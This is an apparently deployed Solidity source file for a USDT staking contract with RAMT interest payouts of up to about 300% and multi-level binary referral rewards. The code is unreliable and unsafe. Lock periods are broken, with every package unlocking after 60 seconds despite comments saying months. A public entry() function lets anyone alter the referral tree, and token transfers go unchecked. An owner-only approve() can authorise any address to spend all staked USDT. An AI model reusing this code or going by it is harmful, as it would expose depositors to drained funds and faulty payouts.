/**
 *Submitted for verification at BscScan.com on 2023-02-08
*/

/**
 *Submitted for verification at BscScan.com on 2023-01-28
*/

// File: contracts/BItBrick/recursiveFunction.sol

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;

/// @title RAMT Staking Project(Recursive for referral rewards)
/// @author Muhammad Farooq(Blockchain Developer at BitBrick Technology Pvt. Ltd.)
contract recursive
{
    ///For storing referral info
    struct referralInfo{
        address referredBy;
        address referredToA;
        uint64 stakingAmountOfA;
        uint64 referralRewardA;
        address referredToB;
        uint64 stakingAmountOfB;
        uint64 referralRewardB;
        uint64 binaryReward;
        uint64 businessReward;
        uint64 myReferrals;
        bool referralRewardAClaimed;
        bool referralRewardBClaimed;
    }
    
    mapping (address => referralInfo) public referralInfos;

    ///To insert referral at proper location using binary tree
    function binaryEntry(address _referredBy, uint64 _stakeAmount) public
    {
        uint64 minReferralStakingAmount;
        uint64 newStakeAmount = _stakeAmount;
        if(_referredBy !=address(0))
        {
                if  (referralInfos[_referredBy].referredToA == address(0))
                {
                    referralInfos[_referredBy].referredToA = msg.sender;
                    referralInfos[msg.sender].referredBy = _referredBy;
                    referralInfos[_referredBy].stakingAmountOfA = newStakeAmount;
                    referralInfos[_referredBy].referralRewardA = ((10 * newStakeAmount)/ 100);
                    referralInfos[_referredBy].myReferrals += 1;
                }
                else if (referralInfos[_referredBy].referredToB == address(0))
                {
                    referralInfos[_referredBy].referredToB = msg.sender;
                    referralInfos[msg.sender].referredBy = _referredBy;
                    referralInfos[_referredBy].stakingAmountOfB = newStakeAmount;
                    referralInfos[_referredBy].referralRewardB = ((10 * newStakeAmount)/ 100);

                    if(referralInfos[_referredBy].stakingAmountOfA == newStakeAmount)
                    {
                        minReferralStakingAmount = newStakeAmount;
                    }
                    else if(referralInfos[_referredBy].stakingAmountOfA < newStakeAmount)
                    {
                        minReferralStakingAmount = referralInfos[_referredBy].stakingAmountOfA;
                    }
                    else
                    {
                        minReferralStakingAmount = newStakeAmount;
                    }
                    referralInfos[_referredBy].binaryReward = ((10 * minReferralStakingAmount)/ 100);
                    referralInfos[_referredBy].businessReward = minReferralStakingAmount;
                    referralInfos[_referredBy].myReferrals += 1;
                }
                else
                {
                    entry(referralInfos[_referredBy].referredToA, referralInfos[_referredBy].referredToB, newStakeAmount);
                }
        }
        else
        {
            require(_referredBy == referralInfos[msg.sender].referredBy,"1");
        }
        
    }

    ///Recursive function for use in binaryEntry function
    function entry(
        address _referredToA,
        address _referredToB,
        uint64 _stakeAmount
        )
        public
    {
        uint64 minReferralStakingAmount;
        uint64 newStakeAmount = _stakeAmount;
        if  (referralInfos[_referredToA].referredToA == address(0))
        {
            referralInfos[_referredToA].referredToA = msg.sender;
            referralInfos[msg.sender].referredBy = _referredToA;
            referralInfos[_referredToA].stakingAmountOfA = newStakeAmount;
            referralInfos[_referredToA].referralRewardA = ((10 * newStakeAmount)/ 100);
            referralInfos[_referredToA].myReferrals += 1;
        }
        else if (referralInfos[_referredToA].referredToB == address(0))
        {
            referralInfos[_referredToA].referredToB = msg.sender;
            referralInfos[msg.sender].referredBy = _referredToA;
            referralInfos[_referredToA].stakingAmountOfB = newStakeAmount;
            referralInfos[_referredToA].referralRewardB = ((10 * newStakeAmount)/ 100);

            if(referralInfos[_referredToA].stakingAmountOfA == newStakeAmount)
            {
                minReferralStakingAmount = newStakeAmount;
            }
            else if(referralInfos[_referredToA].stakingAmountOfA < newStakeAmount)
            {
                minReferralStakingAmount = referralInfos[_referredToA].stakingAmountOfA;
            }
            else
            {
                minReferralStakingAmount = newStakeAmount;
            }
            referralInfos[_referredToA].binaryReward = ((10 * minReferralStakingAmount)/ 100);
            referralInfos[_referredToA].businessReward = minReferralStakingAmount;
            referralInfos[_referredToA].myReferrals += 1;
        }
        else if (referralInfos[_referredToB].referredToA == address(0))
        {
            referralInfos[_referredToB].referredToA = msg.sender;
            referralInfos[msg.sender].referredBy = _referredToB;
            referralInfos[_referredToB].stakingAmountOfA = newStakeAmount;
            referralInfos[_referredToB].referralRewardA = ((10 * newStakeAmount)/ 100);
            referralInfos[_referredToB].myReferrals += 1;
        }
        else if (referralInfos[_referredToB].referredToB == address(0))
        {
            referralInfos[_referredToB].referredToB = msg.sender;
            referralInfos[msg.sender].referredBy = _referredToB;
            referralInfos[_referredToB].stakingAmountOfB = newStakeAmount;
            referralInfos[_referredToB].referralRewardB = ((10 * newStakeAmount)/ 100);
            
            if(referralInfos[_referredToB].stakingAmountOfA == newStakeAmount)
            {
                minReferralStakingAmount = newStakeAmount;
            }
            else if(referralInfos[_referredToB].stakingAmountOfA < newStakeAmount)
            {
                minReferralStakingAmount = referralInfos[_referredToB].stakingAmountOfA;
            }
            else
            {
                minReferralStakingAmount = newStakeAmount;
            }
            referralInfos[_referredToB].binaryReward = ((10 * minReferralStakingAmount)/ 100);
            referralInfos[_referredToB].businessReward = minReferralStakingAmount;
            referralInfos[_referredToB].myReferrals += 1;

        }
        else
        {
            entry(referralInfos[_referredToA].referredToA, referralInfos[_referredToA].referredToB, newStakeAmount);
        }
    }
}
// File: contracts/BItBrick/Staking Project.sol



pragma solidity ^0.8.6;


interface IERC20{
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
}

/// @title RAMT Staking Project
/// @author Muhammad Farooq(Blockchain Developer at BitBrick Technology Pvt. Ltd.)

contract StakeUSDT is recursive {

    IERC20 USDT;
    IERC20 RAMT;
    address public owner;
    uint8 public totalStakers;

    // 30 Days (30 * 24 * 60 * 60)
    uint64 private oneMonthTime = 2592000;
    // Package 1: 30 Months (30 * 30 * 24 * 60 * 60)
    uint64 private package1Time = 2 * 30;
    // Package 2: 25 Months (25 * 30 * 24 * 60 * 60)
    uint64 private package2Time = 2592000 * 25;
    // Package 3: 20 Months (20 * 30 * 24 * 60 * 60)
    uint64 private package3Time = 2592000 * 20;
    // Package 4: 16 Months (16 * 30 * 24 * 60 * 60)
    uint64 private  package4Time = 2592000 * 16;
    // Package 5: 13 Months (13 * 30 * 24 * 60 * 60)
    uint64 private  package5Time = 2592000 * 13;
    // Package 6: 10 Months (10 * 30 * 24 * 60 * 60)
    uint64 private  package6Time = 2592000 * 10;

    struct StakeInfo { 
               
        uint256 startTime;
        uint256 endTime;        
        uint64 amount;
        uint64 package1_to_6;
        uint64 interestAmount;
        uint64 designationRank;
        uint64 designationReward;
        bool staked;
        bool claimed;       
    }

    mapping(address => StakeInfo) public stakeInfos;

    
    event Staked(address indexed from, uint64 amount);
    event Claimed(address indexed from, uint64 amount);
    
    

    constructor(IERC20 _tokenAddressA, IERC20 _tokenAddressB) {
        require(((address(_tokenAddressA) != address(0))&& (address(_tokenAddressB) != address(0))),"Token zero");                
        USDT = _tokenAddressA;
        RAMT = _tokenAddressB;        
        totalStakers = 0;
        owner=msg.sender;
    }

    ///modifiers
    ///@dev only admin
    modifier onlyOwner(){
        require(msg.sender == owner, "Not owner");
        _;
    }

    /// @notice To Claim reward and your staking amount after specified period of staking
    /// @dev will give error if, time not over yet.

    function claimReward() public{
        require(stakeInfos[msg.sender].staked == true, "not a participant");
        require(stakeInfos[msg.sender].endTime < block.timestamp, "Stake Time not over");
        require(stakeInfos[msg.sender].claimed == false, "Already claimed");
        
        uint64 totalTokens = stakeInfos[msg.sender].amount + stakeInfos[msg.sender].interestAmount;
        stakeInfos[msg.sender].claimed = true;
        stakeInfos[msg.sender].staked = false;
        USDT.transfer(msg.sender, stakeInfos[msg.sender].amount);
        RAMT.transfer(msg.sender, stakeInfos[msg.sender].interestAmount);

        emit Claimed(msg.sender, totalTokens);
    }

    /// @notice To stake your
    /// @dev You can get by back, designation, business, binary and referral rewards
    /// @param  _referredBy address, amount you want to stake for specified period
    function stakeToken(
        address _referredBy,
        uint64 _stakeAmount)
        public
        payable
    {
        require(_stakeAmount >= 20, "Min stake 20$");
        require(stakeInfos[msg.sender].staked == false, "already participated");
        require(USDT.balanceOf(msg.sender) >= _stakeAmount, "Insufficient Balance");

        ///Using recursive contract function to allocate referrer and referral reward, binary and busiess reward
        recursive.binaryEntry(_referredBy, _stakeAmount);

        ///Staking amount and saving info through mapping
        ///interestRate1 (50 < 600) = 30 * ((10 * amount)/ 100) ;
        if(_stakeAmount >= 50 && _stakeAmount < 600)
        {
            USDT.transferFrom(msg.sender, address(this), _stakeAmount);

            USDT.approve(address(this), 1000000000); 
            stakeInfos[msg.sender].startTime = block.timestamp;
            stakeInfos[msg.sender].endTime = block.timestamp + package1Time; 
            stakeInfos[msg.sender].amount = _stakeAmount;
            stakeInfos[msg.sender].package1_to_6 = 1;
            stakeInfos[msg.sender].interestAmount = 30 * ((10 * _stakeAmount)/ 100);
            stakeInfos[msg.sender].designationRank = 0;
            stakeInfos[msg.sender].designationReward = 0;
            stakeInfos[msg.sender].staked = true;
            stakeInfos[msg.sender].claimed = false;

            totalStakers++;
            emit Staked(msg.sender, _stakeAmount);
        }

        ///interestRate2 (600 < 1100) = 25 * ((12 * amount)/ 100) ;
        else if (_stakeAmount >= 600 && _stakeAmount < 1100)
        {
            USDT.transferFrom(msg.sender, address(this), _stakeAmount);

            stakeInfos[msg.sender].startTime = block.timestamp;
            stakeInfos[msg.sender].endTime = block.timestamp + package1Time; 
            stakeInfos[msg.sender].amount = _stakeAmount;
            stakeInfos[msg.sender].package1_to_6 = 2;
            stakeInfos[msg.sender].interestAmount = 25 * ((12 * _stakeAmount)/ 100);
            stakeInfos[msg.sender].designationRank = 0;
            stakeInfos[msg.sender].designationReward = 0;
            stakeInfos[msg.sender].staked = true;
            stakeInfos[msg.sender].claimed = false;

            totalStakers++;
            emit Staked(msg.sender, _stakeAmount);
        }

        ///interestRate3 (1100 < 3100) = 20 * ((15 * amount)/ 100) ;
        ///designationReward1 (1100 < 3100) = 100RAMT;
        else if (_stakeAmount >= 1100 && _stakeAmount < 3100)
        {
            USDT.transferFrom(msg.sender, address(this), _stakeAmount);

            stakeInfos[msg.sender].startTime = block.timestamp;
            stakeInfos[msg.sender].endTime = block.timestamp + package1Time; 
            stakeInfos[msg.sender].amount = _stakeAmount;
            stakeInfos[msg.sender].package1_to_6 = 3;
            stakeInfos[msg.sender].interestAmount = 20 * ((15 * _stakeAmount)/ 100);
            stakeInfos[msg.sender].designationRank = 1;
            stakeInfos[msg.sender].designationReward = 100;
            stakeInfos[msg.sender].staked = true;
            stakeInfos[msg.sender].claimed = false;

            RAMT.transfer(_referredBy, stakeInfos[msg.sender].designationReward);

            totalStakers++;
            emit Staked(msg.sender, _stakeAmount);
        }

        ///interestRate4 (3100 < 5100) = 16 * ((18 * amount)/ 100) ;
        ///designationReward1 (3100 < 5100) = 200RAMT;
        else if (_stakeAmount >= 3100 && _stakeAmount < 5100)
        {
            USDT.transferFrom(msg.sender, address(this), _stakeAmount);

            stakeInfos[msg.sender].startTime = block.timestamp;
            stakeInfos[msg.sender].endTime = block.timestamp + package1Time; 
            stakeInfos[msg.sender].amount = _stakeAmount;
            stakeInfos[msg.sender].package1_to_6 = 4;
            stakeInfos[msg.sender].interestAmount = 16 * ((18 * _stakeAmount)/ 100);
            stakeInfos[msg.sender].designationRank = 2;
            stakeInfos[msg.sender].designationReward = 200;
            stakeInfos[msg.sender].staked = true;
            stakeInfos[msg.sender].claimed = false;

            RAMT.transfer(_referredBy, stakeInfos[msg.sender].designationReward);

            totalStakers++;
            emit Staked(msg.sender, _stakeAmount);
        }
        ///interestRate5 (5100 < 11000) = 13 * (((22 + (1/2)) * amount)/ 100) 
        ///designationReward1 (5100 < 11000) = 500RAMT;;
        else if (_stakeAmount >= 5100 && _stakeAmount < 11000)
        {
            USDT.transferFrom(msg.sender, address(this), _stakeAmount);

            stakeInfos[msg.sender].startTime = block.timestamp;
            stakeInfos[msg.sender].endTime = block.timestamp + package1Time; 
            stakeInfos[msg.sender].amount = _stakeAmount;
            stakeInfos[msg.sender].package1_to_6 = 5;
            stakeInfos[msg.sender].interestAmount = 13 * (((22) * _stakeAmount)/ 100);
            stakeInfos[msg.sender].designationRank = 3;
            stakeInfos[msg.sender].designationReward = 500;
            stakeInfos[msg.sender].staked = true;
            stakeInfos[msg.sender].claimed = false;

            RAMT.transfer(_referredBy, stakeInfos[msg.sender].designationReward);

            totalStakers++;
            emit Staked(msg.sender, _stakeAmount);
        }

        ///interestRate6 (11000 >) = 10 * ((30 * amount)/ 100) ;
        ///designationReward1 (11000 < 21000) = 1000RAMT;
        else if (_stakeAmount >= 11000 && _stakeAmount < 21000)
        {
            USDT.transferFrom(msg.sender, address(this), _stakeAmount);

            stakeInfos[msg.sender].startTime = block.timestamp;
            stakeInfos[msg.sender].endTime = block.timestamp + package1Time; 
            stakeInfos[msg.sender].amount = _stakeAmount;
            stakeInfos[msg.sender].package1_to_6 = 6;
            stakeInfos[msg.sender].interestAmount = 10 * ((30 * _stakeAmount)/ 100);
            stakeInfos[msg.sender].designationRank = 4;
            stakeInfos[msg.sender].designationReward = 1000;
            stakeInfos[msg.sender].staked = true;
            stakeInfos[msg.sender].claimed = false;

            RAMT.transfer(_referredBy, stakeInfos[msg.sender].designationReward);

            totalStakers++;
            emit Staked(msg.sender, _stakeAmount);
        }

        ///interestRate6 (11000 >) = 10 * ((30 * amount)/ 100) ;
        ///designationReward1 (21000>) = 1500RAMT;
        else if (_stakeAmount >= 21000)
        {
            USDT.transferFrom(msg.sender, address(this), _stakeAmount);

            stakeInfos[msg.sender].startTime = block.timestamp;
            stakeInfos[msg.sender].endTime = block.timestamp + package1Time; 
            stakeInfos[msg.sender].amount = _stakeAmount;
            stakeInfos[msg.sender].package1_to_6 = 6;
            stakeInfos[msg.sender].interestAmount = 10 * ((30 * _stakeAmount)/ 100);
            stakeInfos[msg.sender].designationRank = 5;
            stakeInfos[msg.sender].designationReward = 1500;
            stakeInfos[msg.sender].staked = true;
            stakeInfos[msg.sender].claimed = false;

            RAMT.transfer(_referredBy, stakeInfos[msg.sender].designationReward);

            totalStakers++;
            emit Staked(msg.sender, _stakeAmount);
        }
        else
        {
            USDT.transferFrom(msg.sender, address(this), _stakeAmount);

            USDT.approve(address(this), 1000000000); 
            stakeInfos[msg.sender].startTime = block.timestamp;
            stakeInfos[msg.sender].endTime = block.timestamp + package1Time; 
            stakeInfos[msg.sender].amount = _stakeAmount;
            stakeInfos[msg.sender].package1_to_6 = 1;
            stakeInfos[msg.sender].interestAmount = 0;
            stakeInfos[msg.sender].designationRank = 0;
            stakeInfos[msg.sender].designationReward = 0;
            stakeInfos[msg.sender].staked = true;
            stakeInfos[msg.sender].claimed = false;

            totalStakers++;
            emit Staked(msg.sender, _stakeAmount);
        }

        ///To Transfer referral reward, binary reward and business reward
        if(_referredBy != address(0))
        {
            if(referralInfos[referralInfos[msg.sender].referredBy].referredToB == 0x0000000000000000000000000000000000000000)
            {
                RAMT.transfer(referralInfos[msg.sender].referredBy, referralInfos[referralInfos[msg.sender].referredBy].referralRewardA);
                referralInfos[_referredBy].referralRewardAClaimed = true;
            }
            else
            {
                RAMT.transfer(referralInfos[msg.sender].referredBy, referralInfos[referralInfos[msg.sender].referredBy].referralRewardB);
                RAMT.transfer(referralInfos[msg.sender].referredBy, referralInfos[referralInfos[msg.sender].referredBy].binaryReward);
                referralInfos[_referredBy].referralRewardBClaimed = true;
                
                if(referralInfos[referralInfos[msg.sender].referredBy].businessReward >=5000 && referralInfos[referralInfos[msg.sender].referredBy].businessReward <10000)
                {
                    referralInfos[referralInfos[msg.sender].referredBy].businessReward = 100;
                    RAMT.transfer(referralInfos[msg.sender].referredBy, referralInfos[referralInfos[msg.sender].referredBy].businessReward);
                }
                else if (referralInfos[referralInfos[msg.sender].referredBy].businessReward >=10000 && referralInfos[referralInfos[msg.sender].referredBy].businessReward <15000)
                {
                    referralInfos[_referredBy].businessReward = 250;
                    RAMT.transfer(referralInfos[msg.sender].referredBy, referralInfos[referralInfos[msg.sender].referredBy].businessReward);
                }
                else if (referralInfos[referralInfos[msg.sender].referredBy].businessReward >=15000 && referralInfos[referralInfos[msg.sender].referredBy].businessReward <20000)
                {
                    referralInfos[_referredBy].businessReward = 500;
                    RAMT.transfer(referralInfos[msg.sender].referredBy, referralInfos[referralInfos[msg.sender].referredBy].businessReward);
                }
                else if (referralInfos[referralInfos[msg.sender].referredBy].businessReward >=20000 && referralInfos[referralInfos[msg.sender].referredBy].businessReward <25000)
                {
                    referralInfos[_referredBy].businessReward = 1000;
                    RAMT.transfer(referralInfos[msg.sender].referredBy, referralInfos[referralInfos[msg.sender].referredBy].businessReward);
                }
                else if (referralInfos[referralInfos[msg.sender].referredBy].businessReward >=25000 && referralInfos[referralInfos[msg.sender].referredBy].businessReward <30000)
                {
                    referralInfos[_referredBy].businessReward = 1500;
                    RAMT.transfer(referralInfos[msg.sender].referredBy, referralInfos[referralInfos[msg.sender].referredBy].businessReward);
                }
                else if (referralInfos[referralInfos[msg.sender].referredBy].businessReward >=30000 && referralInfos[referralInfos[msg.sender].referredBy].businessReward <100000)
                {
                    referralInfos[_referredBy].businessReward = 2000;
                    RAMT.transfer(referralInfos[msg.sender].referredBy, referralInfos[referralInfos[msg.sender].referredBy].businessReward);
                }
                else if (referralInfos[referralInfos[msg.sender].referredBy].businessReward >=100000 && referralInfos[referralInfos[msg.sender].referredBy].businessReward <300000)
                {
                    referralInfos[_referredBy].businessReward = 2500;
                    RAMT.transfer(referralInfos[msg.sender].referredBy, referralInfos[referralInfos[msg.sender].referredBy].businessReward);
                }
                else if (referralInfos[referralInfos[msg.sender].referredBy].businessReward >=300000 && referralInfos[referralInfos[msg.sender].referredBy].businessReward <500000)
                {
                    referralInfos[_referredBy].businessReward = 6000;
                    RAMT.transfer(referralInfos[msg.sender].referredBy, referralInfos[referralInfos[msg.sender].referredBy].businessReward);
                }
                else if (referralInfos[referralInfos[msg.sender].referredBy].businessReward >=500000 && referralInfos[referralInfos[msg.sender].referredBy].businessReward <1000000)
                {
                    referralInfos[_referredBy].businessReward = 10000;
                    RAMT.transfer(referralInfos[msg.sender].referredBy, referralInfos[referralInfos[msg.sender].referredBy].businessReward);
                }
                else if (referralInfos[referralInfos[msg.sender].referredBy].businessReward >=1000000)
                {
                    referralInfos[_referredBy].businessReward = 20000;
                    RAMT.transfer(referralInfos[msg.sender].referredBy, referralInfos[referralInfos[msg.sender].referredBy].businessReward);
                }
            }
        }  
    }

    function approve(address spender, uint256 amount) external onlyOwner {
        IERC20 tokenA = USDT;
        tokenA.approve(spender, amount);
    }
 
}